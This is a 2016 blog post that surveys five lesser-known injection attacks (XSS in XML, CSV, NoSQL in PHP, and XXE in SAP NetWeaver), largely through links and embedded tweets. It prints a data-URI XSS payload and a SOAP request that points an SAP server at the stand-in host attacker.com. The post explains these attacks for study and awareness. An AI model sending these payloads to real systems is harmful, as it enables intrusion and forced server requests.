+++
aliases = [ "20160723" ]
date = "2016-07-23"
title = "Five Interesting Injection Attacks"
+++

Everyone is familiar with SQLi and XSS.  To make things more interesting, here are five more unusual injection attacks that have appeared recently.

<!--more-->

In no particular order:

### XSS in your XML

This "XSS in XML" exploit appears to work in Chrome but not Safari (and didn't test in Firefox).

http://sdl.me/XSSDemo/xss-xml-frames.html

<blockquote class="twitter-tweet" data-lang="en"><p lang="en" dir="ltr">XSS in XML - exploitation demo to run an external JS in full DOM: <a href="https://t.co/42gqNp51zb">https://t.co/42gqNp51zb</a></p>&mdash; Soroush Dalili (@irsdl) <a href="https://twitter.com/irsdl/status/753925964179136512">July 15, 2016</a></blockquote> <script async src="//platform.twitter.com/widgets.js" charset="utf-8"></script>


### Another XSS in your XML


```xml
<x:script xmlns:x="http://www.w3.org/1999/xhtml" src="data:,alert(1)" />
```

http://vulnerabledoma.in/char_test?mime=text/xml&body=%3Cx:script%20xmlns:x=%22http://www.w3.org/1999/xhtml%22%20src=%22data:,alert(1)%22%20/%3E

via

<blockquote class="twitter-tweet" data-lang="en"><p lang="en" dir="ltr">An XML &quot;obfuscated&quot; one by <a href="https://twitter.com/kinugawamasato">@kinugawamasato</a> : <a href="https://t.co/zk8IWRTKse">https://t.co/zk8IWRTKse</a></p>&mdash; XSS Payloads (@XssPayloads) <a href="https://twitter.com/XssPayloads/status/752538375702347776">July 11, 2016</a></blockquote> <script async src="//platform.twitter.com/widgets.js" charset="utf-8"></script>


### CSV Injection

Yes, "Comma Separated Value" injection.  Really???  https://blog.zsec.uk/csv-dangers-mitigations/  The advice is the usual

  It should also be considered that all user input be not trusted
  and as a result any output should be encoded. 

<blockquote class="twitter-tweet" data-lang="en"><p lang="en" dir="ltr">CSV Injection Revisited - Making Things More Dangerious (and fun) : <a href="https://t.co/7uSqcGNiou">https://t.co/7uSqcGNiou</a></p>&mdash; Binni Shah (@binitamshah) <a href="https://twitter.com/binitamshah/status/756804309010919424">July 23, 2016</a></blockquote> <script async src="//platform.twitter.com/widgets.js" charset="utf-8"></script>


### NoSQL Injection

This should really be NoSQL injection using PHP, as the techniques appear to specific to PHP's drivers.

<blockquote class="twitter-tweet" data-lang="en"><p lang="en" dir="ltr">Good read from Nikhil Mattal on MongoDB security and injection attacks with PHP. <a href="https://t.co/evhJHyfNEy">https://t.co/evhJHyfNEy</a> <a href="https://t.co/2ubDYb6FKR">pic.twitter.com/2ubDYb6FKR</a></p>&mdash; Jessica Hall (@JessHallway) <a href="https://twitter.com/JessHallway/status/743529851722825729">June 16, 2016</a></blockquote> <script async src="//platform.twitter.com/widgets.js" charset="utf-8"></script>


This may or may not be a re-hash of [Analysis and Mitigation of NoSQL Injections](http://ieeexplore.ieee.org/xpl/login.jsp?tp=&arnumber=7448357&url=http%3A%2F%2Fieeexplore.ieee.org%2Fiel7%2F8013%2F7448333%2F07448357.pdf%3Farnumber%3D7448357) which came out a few months earlier.

  NoSQL data storage systems have become very popular due to their scalability
  and ease of use. Unfortunately, they lack the security measures and awareness
  that are required for data protection. Although the new data models and query
  formats of NoSQL data stores make old attacks such as SQL injections
  irrelevant, they give attackers new opportunities for injecting their
  malicious code into the statements passed to the database. Analysis of the
  techniques for injecting malicious code into NoSQL data stores provides
  examples of new NoSQL injections as well as Cross-Site Request Forgery
  attacks, allowing attackers to bypass perimeter defenses such as firewalls.
  Analysis of the source of these vulnerabilities and present methodologies can
  mitigate such attacks. Because code analysis alone is insufficient to prevent
  attacks in today's typical large-scale deployment, certain mitigations should
  be done throughout the entire software life cycle.

## XXE Injection

XXE Injection is always a bit of a weirdo.

<blockquote class="twitter-tweet" data-lang="en"><p lang="en" dir="ltr">SAP
NetWeaver AS JAVA 7.5 XXE Injection <a
href="https://t.co/Rf0s6GBPhP">https://t.co/Rf0s6GBPhP</a> <a
href="https://twitter.com/hashtag/exploit?src=hash">#exploit</a></p>&mdash;
packet storm (@packet_storm) <a
href="https://twitter.com/packet_storm/status/743978466169724928">June 18,
2016</a></blockquote> <script async src="//platform.twitter.com/widgets.js"
charset="utf-8"></script>

By uploading a XML file with an external XML entity, you can make the server
send or retrieve arbitrary files or URLs.  The example here is:

```xml
<SOAP-ENV:Envelope
xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/"
xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/"
xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
xmlns:xsd="http://www.w3.org/2001/XMLSchema">
<SOAP-ENV:Body>
 <m:XXX xmlns:m="http://sap.com/monitoring/ws/sn/">
   <url>attacker.com</url>
 </m:XXX>
 </SOAP-ENV:Body>
</SOAP-ENV:Envelope>
```

